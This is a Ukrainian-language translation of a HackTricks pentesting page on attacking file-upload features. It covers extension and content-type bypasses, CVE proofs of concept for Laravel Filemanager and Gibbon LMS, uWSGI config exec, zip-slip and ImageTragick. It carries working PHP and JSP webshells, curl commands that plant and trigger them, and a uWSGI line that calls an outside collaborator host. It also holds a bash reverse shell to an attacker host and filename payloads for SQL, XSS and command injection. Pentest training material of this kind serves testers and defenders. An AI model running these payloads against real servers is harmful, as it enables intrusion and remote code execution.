# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо вони застосовуються, **перевірте** **попередні розширення.** Також протестуйте їх з використанням **великих літер**: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання допустимого розширення перед** виконуваним розширенням (також використовуйте попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Можна використовувати Burp для **bruteforce** всіх **ascii** та **Unicode** символів. (_Зверніть увагу, що також можна спробувати використати **раніше** згадані **розширення**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обманувши парсер розширень** на стороні сервера за допомогою технік, як-от **подвоєння** **розширення** або **додавання сміттєвих** даних (**null** bytes) між розширеннями. _Ви також можете використати **попередні розширення** для підготовки кращого payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте помістити **виконуване розширення перед допустимим** і сподівайтесь на неправильну конфігурацію сервера. (корисно для експлуатації помилок конфігурації Apache, де все, що має розширення** _**.php**_**, навіть якщо файл не закінчується на .php, може виконувати код):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** у **Windows**. У цьому випадку символ двокрапки ":" вставляється після забороненого розширення і перед дозволеним. В результаті на сервері створюється **порожній файл із забороненим розширенням** (наприклад, "file.asax:.jpg”). Цей файл може бути відредагований пізніше іншими методами, такими як використання його короткої назви. Шаблон "**::$data**” також можна використати для створення непорожніх файлів. Тому додавання крапки після цього шаблону може бути корисним для обходу подальших обмежень (.e.g. "file.asp::$data.”)
8. Спробуйте перевантажити ліміти імені файлу. Дійсне розширення обрізається. А шкідливий PHP лишається. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Деякі обробники завантажень обрізають або нормалізують заключні крапки у збереженому імені файлу. В UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) версіях до 2.9.1 можна обійти перевірку розширення таким чином:

- Використати валідний image MIME та magic header (наприклад, PNG’s `\x89PNG\r\n\x1a\n`).
- Назвати завантажуваний файл з PHP-розширенням, за яким слідує крапка, наприклад, `shell.php.`.
- Сервер видаляє кінцеву крапку і зберігає `shell.php`, який виконається, якщо файл опиниться в директорії, що обслуговується веб-сервером (за замовчуванням public storage like `/storage/files/`).

Мінімальний PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Потім зробіть запит до збереженого шляху (типово для Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Оновити unisharp/laravel-filemanager до ≥ 2.9.1.
- Забезпечити суворі allowlists на стороні сервера та повторно перевіряти збережене ім'я файлу.
- Обслуговувати uploads з директорій, де виконання файлів вимкнено.

### Обхід Content-Type, Magic Number, Compression & Resizing

- Обійти **Content-Type** перевірки, встановивши **value** заголовка **Content-Type** на: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійти перевірку **magic number**, додавши на початок файлу **bytes of a real image** (щоб заплутати _file_ команду). Або помістити shell всередину **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **introduce the payload directly** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення застосовується **compression**, наприклад за допомогою стандартних PHP-бібліотек як [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні методи можуть не спрацювати. Проте, ви можете використати **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **переживе стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **resizing** зображення, використовуючи, наприклад, PHP-GD функції `imagecopyresized` або `imagecopyresampled`. Однак ви можете використати **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **переживе стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload, який **переживає зміну розміру зображення**, використовуючи PHP-GD функцію `thumbnailImage`. Проте ви можете використати **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **переживе стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Інші трюки для перевірки

- Знайдіть вразливість, що дозволяє **rename** вже завантаженого файлу (щоб змінити розширення).
- Знайдіть вразливість **Local File Inclusion**, щоб виконати backdoor.
- **Possible Information disclosure**:
1. Завантажте **several times** (і **at the same time**) той **same file** з тим **same name**
2. Завантажте файл з **name** файлу або **folder**, який **already exists**
3. Завантаження файлу з **"." , "..", or "…" as its name**. Наприклад, в Apache на **Windows**, якщо додаток зберігає uploaded файли в директорії "/www/uploads/", ім'я файлу "." створить файл під назвою
uploads” в директорії "/www/".
4. Завантажте файл, який може бути важко видалити, наприклад **"…:.jpg"** в **NTFS**. (Windows)
5. Завантажте файл в **Windows** з **invalid characters**, такими як `|<>*?”` в імені. (Windows)
6. Завантажте файл в **Windows**, використовуючи **reserved** (**forbidden**) **names**, такі як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Спробуйте також **upload an executable** (.exe) або **.html** (менш підозріле), яке **will execute code** при випадковому відкритті жертвою.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Файли `.phar` схожі на `.jar` для java, але для php, і можуть бути **used like a php file** (виконувати їх через php або include в скрипт...).

Розширення `.inc` іноді використовується для php-файлів, які призначені лише для **import files**, тому колись хтось міг дозволити **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Отже, як показано на зображенні нижче, завантажте XML-файл у `$JETTY_BASE/webapps/` і очікуйте shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities можуть бути експлуатовані на uWSGI серверах, якщо є можливість модифікувати `.ini` конфігураційний файл. Файли конфігурації uWSGI використовують специфічний синтаксис для включення "magic" змінних, placeholder-ів і операторів. Зокрема, оператор '@', що застосовується як `@(filename)`, призначений для включення вмісту файлу. Серед різних підтримуваних схем в uWSGI, схема "exec" є особливо потужною, дозволяючи читати дані зі standard output процесу. Цю можливість можна використовувати у шкідливих цілях, таких як Remote Command Execution або Arbitrary File Write/Read, коли обробляється `.ini` конфігураційний файл.

Розгляньте наступний приклад шкідливого `uwsgi.ini` файлу, що демонструє різні схеми:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час розбору конфігураційного файлу. Щоб конфігурація була активована й розібрана, процес uWSGI має бути перезапущений (наприклад після краху або через Denial of Service attack) або файл має бути налаштований на auto-reload. Функція auto-reload, якщо увімкнена, перезавантажує файл через задані інтервали при виявленні змін.

Важливо розуміти вільну (lax) природу розбору конфігураційних файлів у uWSGI. Зокрема, згаданий payload можна вставити в двійковий файл (наприклад, зображення або PDF), що ще більше розширює можливості експлуатації.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Неавторизований endpoint у Gibbon LMS дозволяє здійснити arbitrary file write у межах web root, що призводить до pre-auth RCE шляхом додавання PHP-файлу. Уразливі версії: до і включно 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (сервер ігнорує type/name, base64-декодує хвіст)
- `path`: destination filename relative to Gibbon install dir (наприклад, `poc.php` або `0xdf.php`)
- `gibbonPersonID`: будь-яке непорожнє значення приймається (наприклад, `0000000001`)

Мінімальний PoC для запису та читання файлу:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Завантажте мінімальний webshell та виконайте команди:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Примітки:
- Обробник виконує `base64_decode($_POST["img"])` після розділення за `;` та `,`, потім записує байти у `$absolutePath . '/' . $_POST['path']` без перевірки розширення/типу.
- Отриманий код виконується від імені користувача веб-сервісу (наприклад, XAMPP Apache на Windows).

Джерела щодо цієї вразливості включають usd HeroLab advisory та запис у NVD. Див. секцію References нижче.

## **wget File Upload/SSRF Trick**

В окремих випадках можна виявити, що сервер використовує **`wget`** для **завантаження файлів** і ви можете **вказати** **URL**. У таких випадках код може перевіряти, що розширення завантажених файлів є у білому списку, щоб гарантувати, що завантажуються лише дозволені файли. Однак **цю перевірку можна обійти.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### Escaping upload directory via NTFS junctions (Windows)

(Для цієї атаки вам знадобиться локальний доступ до машини Windows) Якщо завантаження зберігаються в підпапках для кожного користувача у Windows (наприклад, C:\Windows\Tasks\Uploads\<id>\) і ви контролюєте створення/видалення цієї підпапки, ви можете замінити її на directory junction, що вказує на чутливе місце (наприклад, the webroot). Наступні завантаження будуть записані у цільовий шлях, що дозволить code execution, якщо ціль інтерпретує server‑side code.
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Примітки
- mklink /J створює NTFS directory junction (reparse point). Обліковий запис веб‑сервера має переходити по junction і мати права запису в цільовому місці.
- Це перенаправляє довільні операції запису файлів; якщо ціль виконує скрипти (PHP/ASP), це перетворюється на RCE.
- Захист: не дозволяйте writable upload roots бути контрольованими атакуючим під C:\Windows\Tasks або подібними; блокувати створення junction; перевіряти розширення на server‑side; зберігати uploads на окремому томі або з deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Деякі upload/ingest handlers записують raw request body у файловий шлях, який будується з query parameters, контрольованих користувачем. Якщо handler також підтримує Content-Encoding: gzip і не канонізує/не перевіряє destination path, ви можете поєднати directory traversal з gzipped payload, щоб записати довільні байти у каталог, що обслуговується веб‑сервером, і отримати RCE (наприклад, помістити JSP у Tomcat’s webapps).

Generic exploitation flow:
- Підготуйте payload на server-side (наприклад, мінімальний JSP webshell) і стисніть байти gzip.
- Відправте POST, де параметр шляху (наприклад token) містить traversal, що виходить за межі призначеної теки, а file вказує ім'я файлу для збереження. Встановіть Content-Type: application/octet-stream і Content-Encoding: gzip; тіло — стиснений payload.
- Перейдіть до записаного файлу, щоб спричинити виконання.

Ілюстративний запит:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Потім запустіть:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notes
- Шляхи встановлення залежать від інсталяції (наприклад, /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ у деяких стеків). Буде працювати будь-яка веб-доступна папка, що виконує JSP.
- Розширення Burp Suite’s Hackvertor може створити коректний gzip body з вашого payload.
- Це чистий pre-auth arbitrary file write → RCE патерн; він не залежить від multipart parsing.

Mitigations
- Визначайте upload destinations на стороні сервера; ніколи не довіряйте фрагментам шляху від клієнтів.
- Канонізуйте та забезпечуйте, щоб розв'язаний шлях залишався в межах allow-listed базової директорії.
- Зберігайте uploads на не-виконуваному розділі і забороняйте виконання скриптів з writable шляхів.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) — потужний інструмент, створений, щоб допомагати Pentesters та Bug Hunters у тестуванні механізмів file upload. Він використовує різні bug bounty techniques для спрощення процесу ідентифікації та експлуатації вразливостей, забезпечуючи ретельну оцінку веб-застосунків.

### Corrupting upload indices with snprintf quirks (historical)

Деякі застарілі upload handlers, що використовують `snprintf()` або подібні для побудови multi-file масивів з однофайлового upload, можна обдурити, щоб сфальсифікувати структуру `_FILES`. Через невідповідності та усікання в поведінці `snprintf()`, ретельно сформований одиночний upload може виглядати як кілька проіндексованих файлів на боці сервера, вводячи в оману логіку, яка очікує строгого формату (наприклад, трактуючи це як multi-file upload та виконуючи небезпечні гілки). Хоча сьогодні це нішова річ, цей “index corruption” pattern іноді повертається в CTFs та старих кодових базах.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

Якщо ви можете завантажити ZIP, який буде розпакований на сервері, ви можете зробити дві речі:

### Symlink

Завантажте архів, що містить символічні посилання на інші файли; після доступу до розпакованих файлів ви отримаєте доступ до linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпаковувати в різні папки

Неочікуване створення файлів у директоріях під час розпакування — серйозна проблема. Незважаючи на початкові припущення, що така конфігурація може захищати від OS-level command execution через malicious file uploads, підтримка ієрархічної компресії та можливості directory traversal у форматі ZIP можуть бути використані. Це дозволяє зловмисникам обходити обмеження й виходити за межі захищених каталогів для завантажень, маніпулюючи функціоналом розпакування цільової програми.

Автоматизований exploit для створення таких файлів доступний за адресою [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утиліту можна використовувати як показано:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Крім того, доступна опція — **symlink trick with evilarc**. Якщо метою є націлювання на файл, такий як `/flag.txt`, у вашій системі слід створити symlink на цей файл. Це гарантує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад Python-коду, який використовується для створення шкідливого zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання стисненням для file spraying**

Для детальнішої інформації **перегляньте оригінальний допис за**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Написано PHP-код, який виконує команди, передані через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Створюється кілька файлів і збирається zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Імена файлів всередині zip змінюються за допомогою vi або Hex Editor, замінюючи "xxA" на "../" для переходу між директоріями.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб exploit вразливість **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP shell у PNG

Вбудовування PHP shell у чанку IDAT файлу PNG може ефективно обійти певні операції обробки зображень. Функції `imagecopyresized` та `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки їх часто використовують для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP shell залишатися неушкодженим під час таких операцій є суттєвою перевагою в певних сценаріях.

Детальний розгляд цієї техніки, включно з методологією та можливими застосуваннями, наведено в наступній статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Цей ресурс дає повне розуміння процесу та його наслідків.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files служать унікальним інструментом у кібербезпеці, виступаючи хамелеонами, які можуть одночасно коректно існувати в кількох форматах файлів. Цікавий приклад — [GIFAR](https://en.wikipedia.org/wiki/Gifar), гібрид, що одночасно функціонує як GIF і RAR архів. Такі файли не обмежуються цією комбінацією; можливі й інші поєднання, наприклад GIF і JS або PPT і JS.

Основна користь polyglot файлів полягає в їх здатності обходити заходи безпеки, які фільтрують файли за типом. Звична практика в багатьох застосунках — дозволяти для завантаження лише певні типи файлів, наприклад JPEG, GIF або DOC, щоб зменшити ризик шкідливих форматів (наприклад, JS, PHP або Phar). Однак polyglot, відповідаючи структурним вимогам кількох форматів одночасно, може непомітно обійти ці обмеження.

Незважаючи на їх адаптивність, polyglot-файли мають обмеження. Наприклад, хоча polyglot може одночасно бути PHAR і JPEG, успіх його завантаження може залежати від політик платформи щодо розширень файлів. Якщо система суворо контролює дозволені розширення, сама по собі структурна подвійність polyglot може бути недостатньою для гарантії завантаження.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Завантаження валідних JSON так, ніби це PDF

Як уникнути виявлення типу файлу, завантаживши валідний JSON навіть якщо це не дозволено, підробивши PDF (техніки з **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Поки магічні байти `%PDF` знаходяться в перших 1024 байтах, файл вважається валідним (приклад у пості)
- **`pdflib` library**: Додайте фейковий PDF формат всередину поля JSON, щоб бібліотека вважала його pdf (приклад у пості)
- **`file` binary**: Воно може читати до 1048576 байт з файлу. Просто створіть JSON більший за цей розмір, щоб воно не змогло розпарсити вміст як JSON, а всередині JSON помістіть початкову частину реального PDF — і воно вважатиме це PDF

## Посилання

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
